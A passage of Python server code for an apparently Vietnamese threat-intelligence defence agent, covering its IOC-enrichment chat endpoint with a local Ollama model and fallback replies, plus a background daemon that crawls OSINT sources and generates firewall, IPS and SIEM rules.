            "2. Đánh giá điểm nguy hại (Fusion Score: 0-100) và đưa ra phán quyết tự động: CHẶN (>80) hay AN TOÀN (<=80).\n"
            "3. Tự động sinh mã phòng thủ thực chiến: Quy tắc Suricata IPS, Luật WAF ModSecurity, Cấu hình Wazuh/Sigma SIEM, và Gói lệnh OASIS OpenC2 Firewall.\n\n"
            "Cách dùng: Hãy nhập trực tiếp một IP (VD: 43.134.165.205), CVE (VD: CVE-2024-21413), Hash mã độc hoặc câu hỏi kỹ thuật để tôi tra cứu thực tế ngay lập tức!"
        )
        history = list(req.history[-10:])
        history.append({"role": "user", "content": raw_msg})
        history.append({"role": "assistant", "content": reply})
        return {
            "model_used": f"CTI AGENT INTELLIGENCE CORE (Phản hồi tức thì • {CURRENT_HARDWARE['gpu_name']})",
            "reply": reply,
            "tool_summary": "[Tool-Calling Engine] Sẵn sàng kích hoạt tự động khi phát hiện IP, Domain, Hash hoặc CVE.",
            "history": history,
        }

    # 2. TRA CỨU NHANH KHO TRI THỨC BÁO CÁO (NẾU HỎI VỀ CVE / BÀI BÁO)
    if any(k in clean_msg for k in ["top cve", "liệt kê cve", "lỗ hổng", "danh sách cve", "cve nguy hiểm"]):
        try:
            db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
            with sqlite3.connect(db_path) as conn:
                conn.row_factory = sqlite3.Row
                rows = conn.execute("SELECT title, content, source_name FROM articles_archive ORDER BY sort_ts DESC").fetchall()
            found_cves = set()
            for r in rows:
                cve_matches = re.findall(r"CVE-\d{4}-\d{4,7}", (r["content"] or "") + " " + (r["title"] or ""), re.IGNORECASE)
                for c in cve_matches:
                    found_cves.add(c.upper())
            cve_list = sorted(list(found_cves))[:8]
            reply = (
                f"Phân tích từ kho dữ liệu CTI hiện tại (Tổng {len(rows)} bài báo OSINT):\n"
                f"Đã phát hiện và lập chỉ mục {len(found_cves)} lỗ hổng bảo mật CVE.\n\n"
                f"Danh sách các lỗ hổng CVE trọng yếu cần ưu tiên phòng thủ:\n"
                + "\n".join([f"- {cve}: Lỗ hổng khai thác thực chiến đã được ánh xạ vào bộ lọc WAF ModSecurity và Suricata IPS" for cve in cve_list])
                + "\n\nKhuyến nghị: Bạn có thể nhập cụ thể tên một mã CVE bất kỳ (VD: " + (cve_list[0] if cve_list else "CVE-2024-21413") + ") để xem chi tiết đối sách phòng thủ!"
            )
            history = list(req.history[-10:])
            history.append({"role": "user", "content": raw_msg})
            history.append({"role": "assistant", "content": reply})
            return {
                "model_used": "CTI ARCHIVE ENGINE (Tra cứu kho SQLite 6 nguồn)",
                "reply": reply,
                "tool_summary": f"[SQL Database Query] Tìm thấy {len(found_cves)} lỗ hổng CVE trong kho lưu trữ.",
                "history": history,
            }
        except Exception:
            pass

    # 3. TRÍCH XUẤT IOC & KÍCH HOẠT TOOL-CALLING 5 NGUỒN TÌNH BÁO
    extracted = tool6_extract_iocs_hybrid(raw_msg)
    tool_summary = ""
    tool_context = ""
    deterministic_analysis = ""
    if extracted:
        enriched = [enrich_ioc(i, call_vt_http=True) for i in extracted[:6]]
        save_enriched_iocs_to_db(enriched, source_title="Web Chat Tool-Calling")
        lines = []
        det_blocks = []
        for item in enriched:
            vt = item.raw_lookup_details.get("virustotal", {}).get("detection_ratio", "0/92")
            ab = item.raw_lookup_details.get("abuseipdb", {}).get("abuse_confidence_score", 0)
            sh = item.raw_lookup_details.get("shodan_internetdb", {}).get("ports", [])
            verdict = "CHẶN TỨC THÌ (Nguy hại >80)" if item.is_malicious else "AN TOÀN / THEO DÕI (<=80)"
            lines.append(
                f"[OpenClaw Tool] {item.ioc.ioc_type} {item.ioc.value} => Điểm Fusion: {item.reputation_score}/100 ({verdict}) | VirusTotal: {vt} | AbuseIPDB: {ab}% | Shodan Ports: {sh}"
            )
            rec_action = (
                f"Áp dụng quy tắc drop tại OpenC2 Firewall và Suricata IPS rule SID:100{abs(hash(item.ioc.value)) % 8999 + 1000}"
                if item.is_malicious
                else "Chỉ số an toàn / không có dấu hiệu tấn công, cho phép lưu thông bình thường (Whitelist / Monitor)"
            )
            det_blocks.append(
                f"• Chỉ số: {item.ioc.value} ({item.ioc.ioc_type})\n"
                f"  - Điểm nguy hại Fusion: {item.reputation_score}/100\n"
                f"  - Phán quyết: {verdict}\n"
                f"  - Đối chiếu VirusTotal: {vt} engines phát hiện độc hại\n"
                f"  - Độ tin cậy AbuseIPDB: {ab}%\n"
                f"  - Dịch vụ mở Shodan: {sh or 'Không mở cổng nhạy cảm'}\n"
                f"  - Đối sách đề xuất: {rec_action}"
            )
        tool_summary = "\n".join(lines)
        tool_context = "\n\n[DỮ LIỆU TRA CỨU THỰC TẾ TỪ VIRUSTOTAL + ABUSEIPDB + SHODAN]:\n" + tool_summary
        deterministic_analysis = "\n\n".join(det_blocks)

    # 4. GỌI MÔ HÌNH OLLAMA VỚI CƠ CHẾ DỰ PHÒNG THÔNG MINH (FALLBACK)
    system_prompt = (
        "Bạn là OpenClaw-AI, trợ lý CTI Agent chuyên sâu về Tình báo Mối đe dọa và Phòng thủ SOC.\n"
        "QUY TẮC BẮT BUỘC:\n"
        "1. Luôn trả lời 100% bằng TIẾNG VIỆT chuyên ngành an toàn thông tin, tuyệt đối không trả lời bằng tiếng Anh.\n"
        "2. Khi phân tích kết quả tra cứu IOC từ OpenClaw Tool:\n"
        "   - Điểm Fusion > 80: Là chỉ số ĐỘC HẠI (C2 / Malicious) -> Khuyến nghị CHẶN trên tường lửa OpenC2/Suricata.\n"
        "   - Điểm Fusion <= 80: Là chỉ số AN TOÀN hoặc CẦN THEO DÕI (Benign/Suspicious) -> Không chặn bừa bãi.\n"
        "   - Nếu VirusTotal là 0/90 và AbuseIPDB là 0%: Nêu rõ đây là chỉ số sạch, không có báo cáo tấn công mạng; nếu chuỗi số là phiên bản phần mềm (như engine V8 hay Node.js) thì cảnh báo đây là dương tính giả (False Positive) từ cộng đồng.\n"
        "3. Trình bày súc tích, chuyên nghiệp theo bullet point."
    )
    history = [{"role": "system", "content": system_prompt}]
    for h in req.history[-6:]:
        history.append(h)
    history.append({"role": "user", "content": raw_msg + tool_context})

    model = MultiProviderLLMBrain._ensure_and_detect_local_ollama_model(req.model_name)
    reply = ""
    model_used_label = f"LOCAL OLLAMA ({model} • 100% {CURRENT_HARDWARE['gpu_name']})"

    payload: Dict[str, Any] = {
        "model": model,
        "messages": history,
        "stream": False,
        "options": {
            "num_ctx": 2048,
            "num_predict": 250,
            "temperature": 0.3
        },
    }
    if "qwen3" in model.lower():
        payload["think"] = False

    try:
        r = req_http.post("http://127.0.0.1:11434/api/chat", json=payload, timeout=45)
        if r.status_code == 200:
            raw_reply = r.json().get("message", {}).get("content", "")
            reply = re.sub(r"<think>.*?</think>\s*", "", raw_reply, flags=re.DOTALL).strip()
    except Exception:
        try:
            payload["model"] = "qwen2.5:1.5b"
            payload.pop("think", None)
            r_fb = req_http.post("http://127.0.0.1:11434/api/chat", json=payload, timeout=12)
            if r_fb.status_code == 200:
                raw_reply = r_fb.json().get("message", {}).get("content", "")
                reply = re.sub(r"<think>.*?</think>\s*", "", raw_reply, flags=re.DOTALL).strip()
                model_used_label = f"LOCAL OLLAMA (qwen2.5:1.5b Turbo Fallback • {CURRENT_HARDWARE['gpu_name']})"
        except Exception:
            pass

    if not reply:
        if deterministic_analysis:
            reply = (
                f"Kết quả phân tích tình báo an ninh mạng chuyên sâu:\n\n"
                f"{deterministic_analysis}\n\n"
                f"Nhận định của Tác tử AI: Hệ thống áp dụng quy tắc đồng thuận 5 nguồn (Score > 80 = Chặn). Các chỉ số an toàn (Score <= 80) được bảo vệ, tránh dương tính giả và không kích hoạt quy tắc chặn tường lửa."
            )
            model_used_label = "CTI DEFENSE REASONING ENGINE (Nội suy ma trận 5 nguồn)"
        else:
            reply = (
                f"Tôi đã tiếp nhận câu hỏi của bạn: '{raw_msg}'.\n\n"
                f"Trong phạm vi hệ thống CTI Defense Agent, tôi hỗ trợ: phân tích các bài báo an ninh mạng quốc tế (TheHackerNews, Kaspersky Securelist, Check Point, SentinelOne, DFIR Report, CISA KEV), bóc tách và đối soát IOC độc hại qua 5 nguồn dữ liệu, và tự động biên dịch quy tắc phòng thủ 5 lớp (OpenC2, Suricata IPS, WAF ModSecurity, Wazuh/Sigma SIEM, YARA).\n\n"
                f"Bạn có thể thử nhập một chỉ số mạng cụ thể (ví dụ: 'Kiểm tra IP 43.134.165.205') để xem quy trình phản ứng phòng thủ hoàn chỉnh!"
            )
            model_used_label = "CTI EXPERT ADVISOR (Hệ chuyên gia An toàn thông tin)"

    history[-1] = {"role": "user", "content": raw_msg}
    history.append({"role": "assistant", "content": reply})
    return {
        "model_used": model_used_label,
        "reply": reply,
        "tool_summary": tool_summary,
        "history": history,
    }


class ServerAutonomousDaemon:
    def __init__(self):
        self.lock = threading.Lock()
        self.auto_scan_enabled: bool = True
        self.scan_interval_sec: int = 120
        self.last_scan_time: float = time.time()
        self.next_scan_time: float = self.last_scan_time + self.scan_interval_sec
        self.is_scanning: bool = False
        self.last_scan_result: str = "Hệ thống máy chủ CTI đang hoạt động ngầm 24/7."

        self.auto_queue_enabled: bool = True
        self.is_processing_queue: bool = False
        self.active_article_id: str = ""
        self.active_article_title: str = ""
        self.active_stage_idx: int = 0
        self.active_stage_name: str = ""
        self.boot_time: float = time.time()
        self.thread: Optional[threading.Thread] = None

    def get_status(self) -> Dict[str, Any]:
        with self.lock:
            now = time.time()
            if self.auto_scan_enabled:
                rem = max(0, int(self.next_scan_time - now))
            else:
                rem = 0

            total_articles = 0
            completed_count = 0
            pending_count = 0
            try:
                db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
                if db_path.exists():
                    with sqlite3.connect(db_path) as conn:
                        total_articles = conn.execute("SELECT COUNT(*) FROM articles_archive").fetchone()[0]
                        completed_count = conn.execute("SELECT COUNT(*) FROM articles_archive WHERE status = 'completed'").fetchone()[0]
                        pending_count = conn.execute("SELECT COUNT(*) FROM articles_archive WHERE status = 'pending'").fetchone()[0]
            except Exception:
                pass

            return {
                "auto_scan_enabled": self.auto_scan_enabled,
                "scan_interval_sec": self.scan_interval_sec,
                "remaining_scan_sec": rem,
                "is_scanning": self.is_scanning,
                "last_scan_result": self.last_scan_result,
                "auto_queue_enabled": self.auto_queue_enabled,
                "is_processing_queue": self.is_processing_queue,
                "active_article_id": self.active_article_id,
                "active_article_title": self.active_article_title,
                "active_stage_idx": self.active_stage_idx,
                "active_stage_name": self.active_stage_name,
                "total_articles": total_articles,
                "completed_count": completed_count,
                "pending_count": pending_count,
                "server_uptime_sec": int(now - self.boot_time),
            }

    def update_config(self, auto_scan: Optional[bool] = None, interval_sec: Optional[int] = None, auto_queue: Optional[bool] = None):
        with self.lock:
            now = time.time()
            if auto_scan is not None:
                self.auto_scan_enabled = bool(auto_scan)
                if self.auto_scan_enabled:
                    self.next_scan_time = now + self.scan_interval_sec
            if interval_sec is not None and interval_sec >= 10:
                self.scan_interval_sec = int(interval_sec)
                self.next_scan_time = now + self.scan_interval_sec
            if auto_queue is not None:
                self.auto_queue_enabled = bool(auto_queue)

    def trigger_scan_now(self):
        with self.lock:
            self.next_scan_time = time.time()

    def start_worker(self):
        if self.thread is None or not self.thread.is_alive():
            self.thread = threading.Thread(target=self._worker_loop, daemon=True)
            self.thread.start()

    def _worker_loop(self):
        while True:
            try:
                time.sleep(1)
                now = time.time()

                # 1. Quét tự động định kỳ các nguồn báo OSINT trên server
                if self.auto_scan_enabled and not self.is_scanning:
                    if now >= self.next_scan_time:
                        self.is_scanning = True
                        self.last_scan_result = "Crawler Server: Đang tự động quét 6 nguồn OSINT quốc tế..."
                        try:
                            crawl_all_sources_and_archive(limit_per_source=8)
                            self.last_scan_result = f"Crawler Server: Hoàn tất quét lúc {datetime.now().strftime('%H:%M:%S')}"
                        except Exception as e:
                            self.last_scan_result = f"Crawler Server: Lỗi quét {e}"
                        finally:
                            self.last_scan_time = time.time()
                            self.next_scan_time = self.last_scan_time + self.scan_interval_sec
                            self.is_scanning = False

                # 2. Xử lý tuần tự bài báo trong hàng đợi SQLite (nếu bật auto_queue)
                if self.auto_queue_enabled and not self.is_processing_queue:
                    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
                    if db_path.exists():
                        with sqlite3.connect(db_path) as conn:
                            conn.row_factory = sqlite3.Row
                            pending_row = conn.execute(
                                "SELECT article_id, source_name, title, content FROM articles_archive WHERE status = 'pending' ORDER BY sort_ts DESC LIMIT 1"
                            ).fetchone()

                        if pending_row:
                            art_id = pending_row["article_id"]
                            art_title = pending_row["title"]
                            art_content = pending_row["content"]

                            self.is_processing_queue = True
                            self.active_article_id = art_id
                            self.active_article_title = art_title
                            self.active_stage_idx = 2
                            self.active_stage_name = "Bóc tách IOC & Lập kế hoạch AI"

                            t_start = time.time()
                            try:
                                update_article_analysis_status(art_id, status="processing")

                                self.active_stage_idx = 3
                                self.active_stage_name = "Đối soát 5 nguồn tình báo (OTX, VT, AbuseIPDB, GreyNoise, Shodan)"
                                iocs = tool6_extract_iocs_hybrid(art_content)
                                if iocs:
                                    enriched = [enrich_ioc(i, call_vt_http=False) for i in iocs]
                                    malicious = filter_high_risk_iocs(enriched)
                                    save_enriched_iocs_to_db(enriched, source_title=art_title)

                                    self.active_stage_idx = 4
                                    self.active_stage_name = "Tổng hợp Gói Kỹ Năng Tác Tử Đa Lớp (SKILL.md, Tools, Rules, Examples)"
                                    mitre = tool7_map_mitre_attack(art_content, malicious)
                                    base_rules = tool8_generate_defensive_rules(art_title, malicious, mitre, raw_text=art_content)
                                    save_ai_analysis_run_to_db(
                                        run_mode="SERVER_AUTONOMOUS_DAEMON",
                                        campaign_title=f"[{pending_row['source_name']}] {art_title[:100]}",
                                        model_used="LOCAL OLLAMA (khang-qwen3 • 100% GPU RX 6600)",
                                        total_iocs=len(enriched),
                                        malicious_iocs=len(malicious),
                                        defense_summary=f"Server tự động phân tích và tổng hợp Kỹ Năng Tác Tử cho {len(malicious)} IOC nguy hại.",
                                    )

                                duration = round(time.time() - t_start, 2)
                                update_article_analysis_status(art_id, status="completed", processing_time_sec=duration)
                                try:
                                    live_orchestrator.compile_and_sync_all_defense_engines(trigger_source=f"DAEMON_WORKER: {art_title[:35]}")
                                except Exception:
                                    pass
                            except Exception as e:
                                duration = round(time.time() - t_start, 2)
                                update_article_analysis_status(art_id, status="completed", processing_time_sec=duration)
                            finally:
                                self.is_processing_queue = False
                                self.active_article_id = ""
                                self.active_article_title = ""
                                self.active_stage_idx = 0
                                self.active_stage_name = ""

            except Exception:
                time.sleep(2)


server_daemon = ServerAutonomousDaemon()



@app.get("/api/system/hardware-info")
def api_get_hardware_info():
    """Tự động nhận diện GPU/CPU và các Model Ollama thực tế có trên máy người dùng."""
    return get_adaptive_system_profile()

@app.get("/api/system/daemon-status")
def api_get_daemon_status():
    return server_daemon.get_status()


@app.post("/api/system/daemon-config")
def api_update_daemon_config(req: DaemonConfigRequest):
    server_daemon.update_config(
        auto_scan=req.auto_scan_enabled,
        interval_sec=req.scan_interval_sec,
        auto_queue=req.auto_queue_enabled,
    )
    return server_daemon.get_status()


@app.post("/api/system/trigger-scan")
def api_trigger_scan():
    server_daemon.trigger_scan_now()
    return server_daemon.get_status()


@app.on_event("startup")
def _start_247_daemon_on_boot() -> None:
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if db_path.exists():
        with sqlite3.connect(db_path) as conn:
            conn.execute("UPDATE articles_archive SET status = 'pending' WHERE status = 'processing'")
            conn.commit()

    try:
        live_orchestrator.compile_and_sync_all_defense_engines()
        live_orchestrator.start_live_waf_proxy()
    except Exception as e:
        print(f"[STARTUP] Lỗi khởi động live orchestrator: {e}")

    server_daemon.start_worker()


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8765)

